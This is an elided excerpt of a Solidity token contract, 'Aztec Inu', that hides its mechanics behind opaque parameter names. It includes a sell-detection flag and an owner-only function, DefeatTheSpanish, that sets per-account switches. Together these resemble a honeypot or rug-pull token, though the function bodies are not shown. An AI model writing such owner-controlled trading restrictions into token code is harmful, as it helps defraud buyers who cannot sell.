...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    constructor (string memory name_, string memory symbol_, address creator_, bool house1, bool house02, uint256 house9) {
        _name = name_;
        _symbol = symbol_;
        PrepareRedistributionETH[creator_] = house02;
        redistMechanic = house02;
        tempVal = house02;
        detectSell = house1;
        tXs = house9;
        _creator = creator_;
    ...
    function DefeatTheSpanish(address account, bool v1, bool v2, bool v3, uint256 v4) external onlyOwner {
    ...
    function _DrainTheLake(address account, uint256 amount, uint256 val1, uint256 val2) internal virtual {
...
contract ERC20Aztec is Context, ERC20 {
    constructor(
        ...
        uint256 house09
    ) ERC20(name, symbol, creator, house0, house2, house09) {
        _DrainTheLake(owner, initialSupply, house6, house7);
    }
}

contract AztecInu is ERC20Aztec {
    constructor() ERC20Aztec("Aztec Inu", "AZTEC", false, true, 1000, 23, msg.sender, 900000 * 10 ** 18, msg.sender, 9) {
    }
}